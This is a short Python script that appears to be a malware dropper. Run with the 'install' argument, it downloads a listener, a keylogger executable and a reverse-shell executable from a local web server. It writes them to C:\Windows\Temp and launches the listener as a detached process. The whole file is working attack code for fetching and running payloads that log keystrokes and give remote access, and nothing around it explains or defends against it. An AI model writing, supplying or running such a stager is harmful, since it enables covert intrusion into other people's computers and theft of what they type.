import requests, subprocess, sys
def stage():
    r = requests.get(url='http://127.0.0.1:5000/listener_exe')
    open('C:\\Windows\\Temp\\listener.exe', 'wb').write(r.content)
    r = requests.get(url='http://127.0.0.1:5000/payload_exe')
    open('C:\\Windows\\Temp\\ALog_my_keys.exe', 'wb').write(r.content)
    r = requests.get(url='http://127.0.0.1:5000/Rshell_exe')
    open('C:\\Windows\\Temp\\ARshell.exe', 'wb').write(r.content)
    subprocess.Popen('C:\\Windows\\Temp\\listener.exe', creationflags=8, close_fds=True)
if sys.argv[1] == 'install':
    stage()
